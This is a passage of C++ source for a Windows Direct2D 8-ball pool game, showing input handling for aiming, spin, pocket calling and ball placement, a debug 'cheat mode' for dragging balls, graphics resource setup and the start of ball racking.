                            currentGameState = SHOT_IN_PROGRESS;
                            foulCommitted = false;
                            pocketedThisTurn.clear();
                            shotPower = 0; // Reset power after shooting
                            isAiming = false; isDraggingStick = false; // Reset aiming flags
                            keyboardAimingActive = false;
                        }
                    }
                    break;

                case VK_ESCAPE: // Cancel Aim/Shot Setup
                    if ((currentGameState == AIMING || currentGameState == BREAKING) || shotPower > 0)
                    {
                        shotPower = 0.0f;
                        isAiming = false;
                        isDraggingStick = false;
                        keyboardAimingActive = false;
                        // Revert to basic turn state if not breaking
                        if (currentGameState != BREAKING) {
                            currentGameState = (currentPlayer == 1) ? PLAYER1_TURN : PLAYER2_TURN;
                        }
                        //if (currentPlayer == 1) calledPocketP1 = -1;
                        //else                  calledPocketP2 = -1;
                    }
                    break;

                case 'G': // Toggle Cheat Mode
                    cheatModeEnabled = !cheatModeEnabled;
                    if (cheatModeEnabled)
                        MessageBeep(MB_ICONEXCLAMATION); // Play a beep when enabling
                    else
                        MessageBeep(MB_OK); // Play a different beep when disabling
                    break;

                default:
                    // Allow default processing for other keys if needed
                    // return DefWindowProc(hwnd, msg, wParam, lParam); // Usually not needed for WM_KEYDOWN
                    break;
                } // End switch(wParam) for player controls
                return 0; // Indicate player control key was processed
            } // End if(canPlayerControl)
        } // End scope for WM_KEYDOWN case
        // If key wasn't F1/F2 and player couldn't control, maybe allow default processing?
        // return DefWindowProc(hwnd, msg, wParam, lParam); // Or just return 0
        return 0;

        case WM_MOUSEMOVE: {
            ptMouse.x = LOWORD(lParam);
            ptMouse.y = HIWORD(lParam);

            // --- NEW LOGIC: Handle Pocket Hover ---
            if ((currentGameState == CHOOSING_POCKET_P1 && currentPlayer == 1) ||
                (currentGameState == CHOOSING_POCKET_P2 && currentPlayer == 2 && !isPlayer2AI)) {
                int oldHover = currentlyHoveredPocket;
                currentlyHoveredPocket = -1; // Reset
                for (int i = 0; i < 6; ++i) {
                    if (GetDistanceSq((float)ptMouse.x, (float)ptMouse.y, pocketPositions[i].x, pocketPositions[i].y) < HOLE_VISUAL_RADIUS * HOLE_VISUAL_RADIUS * 2.25f) {
                        currentlyHoveredPocket = i;
                        break;
                    }
                }
                if (oldHover != currentlyHoveredPocket) {
                    InvalidateRect(hwnd, NULL, FALSE);
                }
                // Do NOT return 0 here, allow normal mouse angle update to continue
            }
            // --- END NEW LOGIC ---


            cueBall = GetCueBall(); // Declare and get cueBall pointer

            if (isDraggingCueBall && cheatModeEnabled && draggingBallId != -1) {
                Ball* ball = GetBallById(draggingBallId);
                if (ball) {
                    ball->x = (float)ptMouse.x;
                    ball->y = (float)ptMouse.y;
                    ball->vx = ball->vy = 0.0f;
                }
                return 0;
            }

            if (!cueBall) return 0;

            // Update Aiming Logic (Check player turn)
            if (isDraggingCueBall &&
                ((currentPlayer == 1 && currentGameState == BALL_IN_HAND_P1) ||
                    (!isPlayer2AI && currentPlayer == 2 && currentGameState == BALL_IN_HAND_P2) ||
                    currentGameState == PRE_BREAK_PLACEMENT))
            {
                bool behindHeadstring = (currentGameState == PRE_BREAK_PLACEMENT);
                // Tentative position update
                cueBall->x = (float)ptMouse.x;
                cueBall->y = (float)ptMouse.y;
                cueBall->vx = cueBall->vy = 0;
            }
            else if ((isAiming || isDraggingStick) &&
                ((currentPlayer == 1 && (currentGameState == AIMING || currentGameState == BREAKING)) ||
                    (!isPlayer2AI && currentPlayer == 2 && (currentGameState == AIMING || currentGameState == BREAKING))))
            {
                //NEW2 MOUSEBOUND CODE = START
                    /*// Clamp mouse inside table bounds during aiming
                    if (ptMouse.x < TABLE_LEFT) ptMouse.x = TABLE_LEFT;
                if (ptMouse.x > TABLE_RIGHT) ptMouse.x = TABLE_RIGHT;
                if (ptMouse.y < TABLE_TOP) ptMouse.y = TABLE_TOP;
                if (ptMouse.y > TABLE_BOTTOM) ptMouse.y = TABLE_BOTTOM;*/
                //NEW2 MOUSEBOUND CODE = END
                // Aiming drag updates angle and power
                float dx = (float)ptMouse.x - cueBall->x;
                float dy = (float)ptMouse.y - cueBall->y;
                if (dx != 0 || dy != 0) cueAngle = atan2f(dy, dx);
                //float pullDist = GetDistance((float)ptMouse.x, (float)ptMouse.y, aimStartPoint.x, aimStartPoint.y);
                //shotPower = std::min(pullDist / 10.0f, MAX_SHOT_POWER);
                if (!keyboardAimingActive) { // Only update shotPower if NOT keyboard aiming
                    float pullDist = GetDistance((float)ptMouse.x, (float)ptMouse.y, aimStartPoint.x, aimStartPoint.y);
                    shotPower = std::min(pullDist / 10.0f, MAX_SHOT_POWER);
                }
            }
            else if (isSettingEnglish &&
                ((currentPlayer == 1 && (currentGameState == PLAYER1_TURN || currentGameState == AIMING || currentGameState == BREAKING)) ||
                    (!isPlayer2AI && currentPlayer == 2 && (currentGameState == PLAYER2_TURN || currentGameState == AIMING || currentGameState == BREAKING))))
            {
                // Setting English
                float dx = (float)ptMouse.x - spinIndicatorCenter.x;
                float dy = (float)ptMouse.y - spinIndicatorCenter.y;
                float dist = GetDistance(dx, dy, 0, 0);
                if (dist > spinIndicatorRadius) { dx *= spinIndicatorRadius / dist; dy *= spinIndicatorRadius / dist; }
                cueSpinX = dx / spinIndicatorRadius;
                cueSpinY = dy / spinIndicatorRadius;
            }
            else {
                //DISABLE PERM AIMING = START
                /*// Update visual angle even when not aiming/dragging (Check player turn)
                bool canUpdateVisualAngle = ((currentPlayer == 1 && (currentGameState == PLAYER1_TURN || currentGameState == BALL_IN_HAND_P1)) ||
                    (currentPlayer == 2 && !isPlayer2AI && (currentGameState == PLAYER2_TURN || currentGameState == BALL_IN_HAND_P2)) ||
                    currentGameState == PRE_BREAK_PLACEMENT || currentGameState == BREAKING || currentGameState == AIMING);

                if (canUpdateVisualAngle && !isDraggingCueBall && !isAiming && !isDraggingStick && !keyboardAimingActive) // NEW: Prevent mouse override if keyboard aiming
                {
                    // NEW MOUSEBOUND CODE = START
                        // Only update cue angle if mouse is inside the playable table area
                    if (ptMouse.x >= TABLE_LEFT && ptMouse.x <= TABLE_RIGHT &&
                        ptMouse.y >= TABLE_TOP && ptMouse.y <= TABLE_BOTTOM)
                    {
                        // NEW MOUSEBOUND CODE = END
                        Ball* cb = cueBall; // Use function-scope cueBall // Already got cueBall above
                        if (cb) {
                            float dx = (float)ptMouse.x - cb->x;
                            float dy = (float)ptMouse.y - cb->y;
                            if (dx != 0 || dy != 0) cueAngle = atan2f(dy, dx);
                        }
                    } //NEW MOUSEBOUND CODE LINE = DISABLE
                }*/
                //DISABLE PERM AIMING = END
            }
            return 0;
        } // End WM_MOUSEMOVE

        case WM_LBUTTONDOWN: {
            ptMouse.x = LOWORD(lParam);
            ptMouse.y = HIWORD(lParam);

            // --- FOOLPROOF FIX: This block implements the two-stage pocket selection ---
            if ((currentGameState == CHOOSING_POCKET_P1 && currentPlayer == 1) ||
                (currentGameState == CHOOSING_POCKET_P2 && currentPlayer == 2 && !isPlayer2AI)) {

                int clickedPocketIndex = -1;
                // STAGE 1, STEP 1: Check if the click was on any of the 6 pockets
                for (int i = 0; i < 6; ++i) {
                    if (GetDistanceSq((float)ptMouse.x, (float)ptMouse.y, pocketPositions[i].x, pocketPositions[i].y) < HOLE_VISUAL_RADIUS * HOLE_VISUAL_RADIUS * 2.25f) {
                        clickedPocketIndex = i;
                        break;
                    }
                }

                if (clickedPocketIndex != -1) {
                    // STAGE 1, STEP 2: Player clicked on a pocket. Update the choice.
                    // We DO NOT change the game state here. This allows re-selection.
                    if (currentPlayer == 1) calledPocketP1 = clickedPocketIndex;
                    else calledPocketP2 = clickedPocketIndex;
                    InvalidateRect(hwnd, NULL, FALSE); // Redraw to show the arrow has moved.
                    return 0; // Consume the click and stay in CHOOSING_POCKET state.
                }

                // STAGE 2, STEP 1: Check if the player is clicking the cue ball to confirm.
                Ball* cueBall = GetCueBall();
                int calledPocket = (currentPlayer == 1) ? calledPocketP1 : calledPocketP2;
                if (cueBall && calledPocket != -1 && GetDistanceSq(cueBall->x, cueBall->y, (float)ptMouse.x, (float)ptMouse.y) < BALL_RADIUS * BALL_RADIUS * 25) {
                    // STAGE 2, STEP 2: A pocket has been selected, and the player now clicks the cue ball.
                    // NOW we transition to the normal aiming state.
                    currentGameState = AIMING; // Go to a generic aiming state.
                    pocketCallMessage = L""""; // Clear the ""Choose a pocket..."" message.
                    isAiming = true; // Prepare for aiming.
                    aimStartPoint = D2D1::Point2F((float)ptMouse.x, (float)ptMouse.y); // Use your existing aim start variable.
                    return 0;
                }

                // If they click anywhere else (not a pocket, not the cue ball), do nothing.
                return 0;
            }

            /*// --- FOOLPROOF FIX: This block handles re-selectable pocket choice ---
            if ((currentGameState == CHOOSING_POCKET_P1 && currentPlayer == 1) ||
                (currentGameState == CHOOSING_POCKET_P2 && currentPlayer == 2 && !isPlayer2AI)) {

                int clickedPocketIndex = -1;
                // Check if the click was on any of the 6 pockets
                for (int i = 0; i < 6; ++i) {
                    if (GetDistanceSq((float)ptMouse.x, (float)ptMouse.y, pocketPositions[i].x, pocketPositions[i].y) < HOLE_VISUAL_RADIUS * HOLE_VISUAL_RADIUS * 2.25f) {
                        clickedPocketIndex = i;
                        break;
                    }
                }

                if (clickedPocketIndex != -1) { // Player clicked on a pocket
                    // FIX: Update the called pocket, but DO NOT change the game state.
                    // This allows the player to click another pocket to change their mind.
                    if (currentPlayer == 1) calledPocketP1 = clickedPocketIndex;
                    else calledPocketP2 = clickedPocketIndex;
                    InvalidateRect(hwnd, NULL, FALSE); // Redraw to show updated arrow
                    return 0; // Consume the click and stay in CHOOSING_POCKET state
                }

                // FIX: Add new logic to CONFIRM the choice by clicking the cue ball.
                Ball* cueBall = GetCueBall();
                int calledPocket = (currentPlayer == 1) ? calledPocketP1 : calledPocketP2;
                if (cueBall && calledPocket != -1 && GetDistanceSq(cueBall->x, cueBall->y, (float)ptMouse.x, (float)ptMouse.y) < BALL_RADIUS * BALL_RADIUS * 25) {
                    // A pocket has been selected, and the player now clicks the cue ball.
                    // NOW we transition to the normal aiming state.
                    currentGameState = AIMING; // Go to aiming, not PLAYER1_TURN
                    pocketCallMessage = L""""; // Clear the ""Choose a pocket..."" message
                    isAiming = true; // Prepare for aiming
                    aimStartPoint = D2D1::Point2F((float)ptMouse.x, (float)ptMouse.y);
                    return 0;
                }

                // If they click anywhere else (not a pocket, not the cue ball), do nothing.
                return 0;
            }*/

            /*// --- handle pocket re-selection when choosing 8-ball pocket ---
            if ((currentGameState == CHOOSING_POCKET_P1 && currentPlayer == 1)
                || (currentGameState == CHOOSING_POCKET_P2 && currentPlayer == 2 && !isPlayer2AI))
            {
                POINT pt = { LOWORD(lParam), HIWORD(lParam) };
                for (int i = 0; i < 6; ++i) {
                    float dx = pt.x - pocketPositions[i].x;
                    float dy = pt.y - pocketPositions[i].y;
                    if (dx * dx + dy * dy <= POCKET_RADIUS * POCKET_RADIUS) {
                        // 1) Record the call
                        if (currentPlayer == 1) calledPocketP1 = i;
                        else                  calledPocketP2 = i;
                        // 2) Clear any prompt text
                        pocketCallMessage.clear();
                        // 3) Return to normal aiming state
                        currentGameState = (currentPlayer == 1) ? PLAYER1_TURN : PLAYER2_TURN;
                        // 4) Redraw (arrow stays because calledPocketP* >= 0)
                        InvalidateRect(hwnd, NULL, FALSE);
                        return 0; // consume click
                    }
                }
                return 0; // clicked outside ? stay in pocket?call until a valid pocket is chosen
            }*/

            // … rest of your click?to?aim logic …

            //replaced /w new code
            /*
            // --- FIX: Add this entire block at the top of WM_LBUTTONDOWN ---
    // This handles input specifically for the pocket selection state.
            if ((currentGameState == CHOOSING_POCKET_P1 && currentPlayer == 1) ||
                (currentGameState == CHOOSING_POCKET_P2 && currentPlayer == 2 && !isPlayer2AI)) {

                int clickedPocketIndex = -1;
                // Check if the click was on any of the 6 pockets
                for (int i = 0; i < 6; ++i) {
                    if (GetDistanceSq((float)ptMouse.x, (float)ptMouse.y, pocketPositions[i].x, pocketPositions[i].y) < HOLE_VISUAL_RADIUS * HOLE_VISUAL_RADIUS * 2.25f) {
                        clickedPocketIndex = i;
                        break;
                    }
                }

                if (clickedPocketIndex != -1) {
                    // A pocket was clicked. Update the selection but STAY in the choosing state.
                    // This allows the player to click another pocket to change their mind.
                    if (currentPlayer == 1) calledPocketP1 = clickedPocketIndex;
                    else calledPocketP2 = clickedPocketIndex;
                    InvalidateRect(hwnd, NULL, FALSE); // Redraw to show the arrow has moved.
                    return 0; // Consume the click and wait for the next action.
                }

                // If the player clicks the CUE BALL, that confirms their pocket selection.
                Ball* cueBall = GetCueBall();
                int calledPocket = (currentPlayer == 1) ? calledPocketP1 : calledPocketP2;
                if (cueBall && calledPocket != -1 && GetDistanceSq(cueBall->x, cueBall->y, (float)ptMouse.x, (float)ptMouse.y) < BALL_RADIUS * BALL_RADIUS * 25) {
                    // A pocket has been selected, and the player now clicks the cue ball.
                    // NOW we transition to the normal aiming state.
                    currentGameState = (currentPlayer == 1) ? PLAYER1_TURN : PLAYER2_TURN;
                    pocketCallMessage = L""""; // Clear the ""Choose a pocket..."" message
                    isAiming = true; // Prepare for aiming
                    aimStartPoint = D2D1::Point2F((float)ptMouse.x, (float)ptMouse.y); // Use your existing aim start variable
                    return 0;
                }

                // If they click anywhere else (not a pocket, not the cue ball), do nothing.
                return 0;
            }
            // --- END OF THE NEW BLOCK ---
            */
            //new code ends here

            if (cheatModeEnabled) {
                // Allow dragging any ball freely
                for (Ball& ball : balls) {
                    float distSq = GetDistanceSq(ball.x, ball.y, (float)ptMouse.x, (float)ptMouse.y);
                    if (distSq <= BALL_RADIUS * BALL_RADIUS * 4) { // Click near ball
                        isDraggingCueBall = true;
                        draggingBallId = ball.id;
                        if (ball.id == 0) {
                            // If dragging cue ball manually, ensure we stay in Ball-In-Hand state
                            if (currentPlayer == 1)
                                currentGameState = BALL_IN_HAND_P1;
                            else if (currentPlayer == 2 && !isPlayer2AI)
                                currentGameState = BALL_IN_HAND_P2;
                        }
                        return 0;
                    }
                }
            }

            Ball* cueBall = GetCueBall(); // Declare and get cueBall pointer            

            // Check which player is allowed to interact via mouse click
            bool canPlayerClickInteract = ((currentPlayer == 1) || (currentPlayer == 2 && !isPlayer2AI));
            // Define states where interaction is generally allowed
            bool canInteractState = (currentGameState == PLAYER1_TURN || currentGameState == PLAYER2_TURN ||
                currentGameState == AIMING || currentGameState == BREAKING ||
                currentGameState == BALL_IN_HAND_P1 || currentGameState == BALL_IN_HAND_P2 ||
                currentGameState == PRE_BREAK_PLACEMENT);

            // Check Spin Indicator first (Allow if player's turn/aim phase)
            if (canPlayerClickInteract && canInteractState) {
                float spinDistSq = GetDistanceSq((float)ptMouse.x, (float)ptMouse.y, spinIndicatorCenter.x, spinIndicatorCenter.y);
                if (spinDistSq < spinIndicatorRadius * spinIndicatorRadius * 1.2f) {
                    isSettingEnglish = true;
                    float dx = (float)ptMouse.x - spinIndicatorCenter.x;
                    float dy = (float)ptMouse.y - spinIndicatorCenter.y;
                    float dist = GetDistance(dx, dy, 0, 0);
                    if (dist > spinIndicatorRadius) { dx *= spinIndicatorRadius / dist; dy *= spinIndicatorRadius / dist; }
                    cueSpinX = dx / spinIndicatorRadius;
                    cueSpinY = dy / spinIndicatorRadius;
                    isAiming = false; isDraggingStick = false; isDraggingCueBall = false;
                    return 0;
                }
            }

            if (!cueBall) return 0;

            // Check Ball-in-Hand placement/drag
            bool isPlacingBall = (currentGameState == BALL_IN_HAND_P1 || currentGameState == BALL_IN_HAND_P2 || currentGameState == PRE_BREAK_PLACEMENT);
            bool isPlayerAllowedToPlace = (isPlacingBall &&
                ((currentPlayer == 1 && currentGameState == BALL_IN_HAND_P1) ||
                    (currentPlayer == 2 && !isPlayer2AI && currentGameState == BALL_IN_HAND_P2) ||
                    (currentGameState == PRE_BREAK_PLACEMENT))); // Allow current player in break setup

            if (isPlayerAllowedToPlace) {
                float distSq = GetDistanceSq(cueBall->x, cueBall->y, (float)ptMouse.x, (float)ptMouse.y);
                if (distSq < BALL_RADIUS * BALL_RADIUS * 9.0f) {
                    isDraggingCueBall = true;
                    isAiming = false; isDraggingStick = false;
                }
                else {
                    bool behindHeadstring = (currentGameState == PRE_BREAK_PLACEMENT);
                    if (IsValidCueBallPosition((float)ptMouse.x, (float)ptMouse.y, behindHeadstring)) {
                        cueBall->x = (float)ptMouse.x; cueBall->y = (float)ptMouse.y;
                        cueBall->vx = 0; cueBall->vy = 0;
                        isDraggingCueBall = false;
                        // Transition state
                        if (currentGameState == PRE_BREAK_PLACEMENT) currentGameState = BREAKING;
                        else if (currentGameState == BALL_IN_HAND_P1) currentGameState = PLAYER1_TURN;
                        else if (currentGameState == BALL_IN_HAND_P2) currentGameState = PLAYER2_TURN;
                        cueAngle = 0.0f;
                    }
                }
                return 0;
            }

            // Check for starting Aim (Cue Ball OR Stick)
            bool canAim = ((currentPlayer == 1 && (currentGameState == PLAYER1_TURN || currentGameState == BREAKING)) ||
                (currentPlayer == 2 && !isPlayer2AI && (currentGameState == PLAYER2_TURN || currentGameState == BREAKING)));

            if (canAim) {
                const float stickDrawLength = 150.0f * 1.4f;
                float currentStickAngle = cueAngle + PI;
                D2D1_POINT_2F currentStickEnd = D2D1::Point2F(cueBall->x + cosf(currentStickAngle) * stickDrawLength, cueBall->y + sinf(currentStickAngle) * stickDrawLength);
                D2D1_POINT_2F currentStickTip = D2D1::Point2F(cueBall->x + cosf(currentStickAngle) * 5.0f, cueBall->y + sinf(currentStickAngle) * 5.0f);
                float distToStickSq = PointToLineSegmentDistanceSq(D2D1::Point2F((float)ptMouse.x, (float)ptMouse.y), currentStickTip, currentStickEnd);
                float stickClickThresholdSq = 36.0f;
                float distToCueBallSq = GetDistanceSq(cueBall->x, cueBall->y, (float)ptMouse.x, (float)ptMouse.y);
                float cueBallClickRadiusSq = BALL_RADIUS * BALL_RADIUS * 25;

                bool clickedStick = (distToStickSq < stickClickThresholdSq);
                bool clickedCueArea = (distToCueBallSq < cueBallClickRadiusSq);

                if (clickedStick || clickedCueArea) {
                    isDraggingStick = clickedStick && !clickedCueArea;
                    isAiming = clickedCueArea;
                    aimStartPoint = D2D1::Point2F((float)ptMouse.x, (float)ptMouse.y);
                    shotPower = 0;
                    float dx = (float)ptMouse.x - cueBall->x;
                    float dy = (float)ptMouse.y - cueBall->y;
                    if (dx != 0 || dy != 0) cueAngle = atan2f(dy, dx);
                    if (currentGameState != BREAKING) currentGameState = AIMING;
                }
            }
            return 0;
        } // End WM_LBUTTONDOWN


        case WM_LBUTTONUP: {
            // --- FOOLPROOF FIX for Cheat Mode Scoring ---
            if (cheatModeEnabled && draggingBallId != -1) {
                Ball* b = GetBallById(draggingBallId);
                if (b) {
                    for (int p = 0; p < 6; ++p) {
                        float dx = b->x - pocketPositions[p].x;
                        float dy = b->y - pocketPositions[p].y;
                        if (dx * dx + dy * dy <= POCKET_RADIUS * POCKET_RADIUS) {
                            // --- This is the new, ""smarter"" logic ---
                            b->isPocketed = true; // Pocket the ball visually.

                            // If the table is open, assign types based on this cheated ball.
                            if (player1Info.assignedType == BallType::NONE && b->id != 0 && b->id != 8) {
                                AssignPlayerBallTypes(b->type, false);
                            }

                            // Now, correctly update the score for the right player.
                            if (b->id != 0 && b->id != 8) {
                                if (b->type == player1Info.assignedType) {
                                    player1Info.ballsPocketedCount++;
                                }
                                else if (b->type == player2Info.assignedType) {
                                    player2Info.ballsPocketedCount++;
                                }
                            }
                            break; // Stop checking pockets.
                        }
                    }
                }
            }

            /*if (cheatModeEnabled && draggingBallId != -1) {
                Ball* b = GetBallById(draggingBallId);
                if (b) {
                    for (int p = 0; p < 6; ++p) {
                        float dx = b->x - pocketPositions[p].x;
                        float dy = b->y - pocketPositions[p].y;
                        if (dx * dx + dy * dy <= POCKET_RADIUS * POCKET_RADIUS) {
                            // --- Assign ball type on first cheat-pocket if table still open ---
                            if (player1Info.assignedType == BallType::NONE
                                && player2Info.assignedType == BallType::NONE
                                && (b->type == BallType::SOLID || b->type == BallType::STRIPE))
                            {
                                // In cheat mode, let's just assign to the current player
                                AssignPlayerBallTypes(b->type);
                            }
                            b->isPocketed = true;
                            pocketedThisTurn.push_back(b->id);

                            // --- FIX FOR CHEAT MODE SCORING ---
                            // Immediately increment the correct player's count based on ball type,
                            // not whose turn it is.
                            if (b->id != 0 && b->id != 8) {
                                if (b->type == player1Info.assignedType) {
                                    player1Info.ballsPocketedCount++;
                                }
                                else if (b->type == player2Info.assignedType) {
                                    player2Info.ballsPocketedCount++;
                                }
                            }
                            // --- END FIX ---
                            // --- NEW: If this was the 7th ball, trigger the arrow call UI ---
                            if (b->id != 8) {
                                PlayerInfo& shooter = (currentPlayer == 1 ? player1Info : player2Info);
                                if (shooter.ballsPocketedCount >= 7
                                    && calledPocketP1 < 0
                                    && calledPocketP2 < 0)
                                {
                                    currentGameState = (currentPlayer == 1)
                                        ? CHOOSING_POCKET_P1
                                        : CHOOSING_POCKET_P2;
                                }
                                else {
                                    // For any other cheat?pocket, keep the turn so you can continue aiming
                                    currentGameState = (currentPlayer == 1)
                                        ? PLAYER1_TURN
                                        : PLAYER2_TURN;
                                }
                            }
                            // --- NEW: If it was the 8-Ball, award instant victory ---
                            else {
                                currentGameState = GAME_OVER;
                                gameOverMessage = (currentPlayer == 1 ? player1Info.name : player2Info.name)
                                    + std::wstring(L"" Wins!"");
                            }
                            break;
                        }
                    }
                }
            }*/

            ptMouse.x = LOWORD(lParam);
            ptMouse.y = HIWORD(lParam);

            Ball* cueBall = GetCueBall(); // Get cueBall pointer

            // Check for releasing aim drag (Stick OR Cue Ball)
            if ((isAiming || isDraggingStick) &&
                ((currentPlayer == 1 && (currentGameState == AIMING || currentGameState == BREAKING)) ||
                    (!isPlayer2AI && currentPlayer == 2 && (currentGameState == AIMING || currentGameState == BREAKING))))
            {
                bool wasAiming = isAiming;
                bool wasDraggingStick = isDraggingStick;
                isAiming = false; isDraggingStick = false;

                if (shotPower > 0.15f) { // Check power threshold
                    if (currentGameState != AI_THINKING) {
                        firstHitBallIdThisShot = -1; cueHitObjectBallThisShot = false; railHitAfterContact = false; // Reset foul flags
                        std::thread([](const TCHAR* soundName) { PlaySound(soundName, NULL, SND_FILENAME | SND_NODEFAULT); }, TEXT(""cue.wav"")).detach();
                        ApplyShot(shotPower, cueAngle, cueSpinX, cueSpinY);
                        currentGameState = SHOT_IN_PROGRESS;
                        foulCommitted = false; pocketedThisTurn.clear();
                    }
                }
                else if (currentGameState != AI_THINKING) { // Revert state if power too low
                    if (currentGameState == BREAKING) { /* Still breaking */ }
                    else {
                        currentGameState = (currentPlayer == 1) ? PLAYER1_TURN : PLAYER2_TURN;
                        if (currentPlayer == 2 && isPlayer2AI) aiTurnPending = false;
                    }
                }
                shotPower = 0; // Reset power indicator regardless
            }

            // Handle releasing cue ball drag (placement)
            if (isDraggingCueBall) {
                isDraggingCueBall = false;
                // Check player allowed to place
                bool isPlacingState = (currentGameState == BALL_IN_HAND_P1 || currentGameState == BALL_IN_HAND_P2 || currentGameState == PRE_BREAK_PLACEMENT);
                bool isPlayerAllowed = (isPlacingState &&
                    ((currentPlayer == 1 && currentGameState == BALL_IN_HAND_P1) ||
                        (currentPlayer == 2 && !isPlayer2AI && currentGameState == BALL_IN_HAND_P2) ||
                        (currentGameState == PRE_BREAK_PLACEMENT)));

                if (isPlayerAllowed && cueBall) {
                    bool behindHeadstring = (currentGameState == PRE_BREAK_PLACEMENT);
                    if (IsValidCueBallPosition(cueBall->x, cueBall->y, behindHeadstring)) {
                        // Finalize position already set by mouse move
                        // Transition state
                        if (currentGameState == PRE_BREAK_PLACEMENT) currentGameState = BREAKING;
                        else if (currentGameState == BALL_IN_HAND_P1) currentGameState = PLAYER1_TURN;
                        else if (currentGameState == BALL_IN_HAND_P2) currentGameState = PLAYER2_TURN;
                        cueAngle = 0.0f;
                        /* ----------------------------------------------------
                        If the player who now has the turn is already on the
                        8-ball, immediately switch to pocket-selection state.
                        ---------------------------------------------------- */
                        if (currentGameState == PLAYER1_TURN || currentGameState == PLAYER2_TURN)
                        {
                            CheckAndTransitionToPocketChoice(currentPlayer);
                        }
                    }
                    else { /* Stay in BALL_IN_HAND state if final pos invalid */ }
                }
            }

            // Handle releasing english setting
            if (isSettingEnglish) {
                isSettingEnglish = false;
            }
            return 0;
        } // End WM_LBUTTONUP

        case WM_DESTROY:
            isMusicPlaying = false;
            if (midiDeviceID != 0) {
                mciSendCommand(midiDeviceID, MCI_CLOSE, 0, NULL);
                midiDeviceID = 0;
                SaveSettings(); // Save settings on exit
            }
            PostQuitMessage(0);
            return 0;

        default:
            return DefWindowProc(hwnd, msg, wParam, lParam);
        }
        return 0;
    }

    // --- Direct2D Resource Management ---

    HRESULT CreateDeviceResources() {
        HRESULT hr = S_OK;

        // Create Direct2D Factory
        if (!pFactory) {
            hr = D2D1CreateFactory(D2D1_FACTORY_TYPE_SINGLE_THREADED, &pFactory);
            if (FAILED(hr)) return hr;
        }

        // Create DirectWrite Factory
        if (!pDWriteFactory) {
            hr = DWriteCreateFactory(
                DWRITE_FACTORY_TYPE_SHARED,
                __uuidof(IDWriteFactory),
                reinterpret_cast<IUnknown**>(&pDWriteFactory)
            );
            if (FAILED(hr)) return hr;
        }

        // Create Text Formats
        if (!pTextFormat && pDWriteFactory) {
            hr = pDWriteFactory->CreateTextFormat(
                L""Segoe UI"", NULL, DWRITE_FONT_WEIGHT_NORMAL, DWRITE_FONT_STYLE_NORMAL, DWRITE_FONT_STRETCH_NORMAL,
                16.0f, L""en-us"", &pTextFormat
            );
            if (FAILED(hr)) return hr;
            // Center align text
            pTextFormat->SetTextAlignment(DWRITE_TEXT_ALIGNMENT_CENTER);
            pTextFormat->SetParagraphAlignment(DWRITE_PARAGRAPH_ALIGNMENT_CENTER);
        }
        if (!pLargeTextFormat && pDWriteFactory) {
            hr = pDWriteFactory->CreateTextFormat(
                L""Impact"", NULL, DWRITE_FONT_WEIGHT_BOLD, DWRITE_FONT_STYLE_NORMAL, DWRITE_FONT_STRETCH_NORMAL,
                48.0f, L""en-us"", &pLargeTextFormat
            );
            if (FAILED(hr)) return hr;
            pLargeTextFormat->SetTextAlignment(DWRITE_TEXT_ALIGNMENT_LEADING); // Align left
            pLargeTextFormat->SetParagraphAlignment(DWRITE_PARAGRAPH_ALIGNMENT_CENTER);
        }


        // Create Render Target (needs valid hwnd)
        if (!pRenderTarget && hwndMain) {
            RECT rc;
            GetClientRect(hwndMain, &rc);
            D2D1_SIZE_U size = D2D1::SizeU(rc.right - rc.left, rc.bottom - rc.top);

            hr = pFactory->CreateHwndRenderTarget(
                D2D1::RenderTargetProperties(),
                D2D1::HwndRenderTargetProperties(hwndMain, size),
                &pRenderTarget
            );
            if (FAILED(hr)) {
                // If failed, release factories if they were created in this call
                SafeRelease(&pTextFormat);
                SafeRelease(&pLargeTextFormat);
                SafeRelease(&pDWriteFactory);
                SafeRelease(&pFactory);
                pRenderTarget = nullptr; // Ensure it's null on failure
                return hr;
            }
        }

        return hr;
    }

    void DiscardDeviceResources() {
        SafeRelease(&pRenderTarget);
        SafeRelease(&pTextFormat);
        SafeRelease(&pLargeTextFormat);
        SafeRelease(&pDWriteFactory);
        // Keep pFactory until application exit? Or release here too? Let's release.
        SafeRelease(&pFactory);
    }

    void OnResize(UINT width, UINT height) {
        if (pRenderTarget) {
            D2D1_SIZE_U size = D2D1::SizeU(width, height);
            pRenderTarget->Resize(size); // Ignore HRESULT for simplicity here
        }
    }

    // --- Game Initialization ---
    void InitGame() {
        srand((unsigned int)time(NULL)); // Seed random number generator
        isOpeningBreakShot = true; // This is the start of a new game, so the next shot is an opening break.
        aiPlannedShotDetails.isValid = false; // Reset AI planned shot
        aiIsDisplayingAim = false;
        aiAimDisplayFramesLeft = 0;
        // ... (rest of InitGame())

        // --- Ensure pocketed list is clear from the absolute start ---
        pocketedThisTurn.clear();

        balls.clear(); // Clear existing balls

        // Reset Player Info (Names should be set by Dialog/wWinMain/ResetGame)
        player1Info.assignedType = BallType::NONE;
        player1Info.ballsPocketedCount = 0;
        // Player 1 Name usually remains ""Player 1""
        player2Info.assignedType = BallType::NONE;
        player2Info.ballsPocketedCount = 0;
        // Player 2 Name is set based on gameMode in ShowNewGameDialog
            // --- Reset any 8?Ball call state on new game ---
        lastEightBallPocketIndex = -1;
        calledPocketP1 = -1;
        calledPocketP2 = -1;
        pocketCallMessage = L"""";
        aiPlannedShotDetails.isValid = false; // THIS IS THE CRITICAL FIX: Reset the AI's plan.

        // Create Cue Ball (ID 0)
        // Initial position will be set during PRE_BREAK_PLACEMENT state
        balls.push_back({ 0, BallType::CUE_BALL, TABLE_LEFT + TABLE_WIDTH * 0.15f, RACK_POS_Y, 0, 0, CUE_BALL_COLOR, false });

        // --- Create Object Balls (Temporary List) ---
        std::vector<Ball> objectBalls;
        // Solids (1-7, Yellow)
        for (int i = 1; i <= 7; ++i) {
            //objectBalls.push_back({ i, BallType::SOLID, 0, 0, 0, 0, SOLID_COLOR, false });
            objectBalls.push_back({ i, BallType::SOLID, 0,0,0,0,
                        GetBallColor(i), false });
        }
        // Stripes (9-15, Red)
        for (int i = 9; i <= 15; ++i) {
            //objectBalls.push_back({ i, BallType::STRIPE, 0, 0, 0, 0, STRIPE_COLOR, false });
            objectBalls.push_back({ i, BallType::STRIPE, 0,0,0,0,
                        GetBallColor(i), false });
        }
        // 8-Ball (ID 8) - Add it to the list to be placed
        //objectBalls.push_back({ 8, BallType::EIGHT_BALL, 0, 0, 0, 0, EIGHT_BALL_COLOR, false });
        objectBalls.push_back({ 8, BallType::EIGHT_BALL, 0,0,0,0,
              GetBallColor(8), false });


        // --- Racking Logic (Improved) ---
        float spacingX = BALL_RADIUS * 2.0f * 0.866f; // cos(30) for horizontal spacing
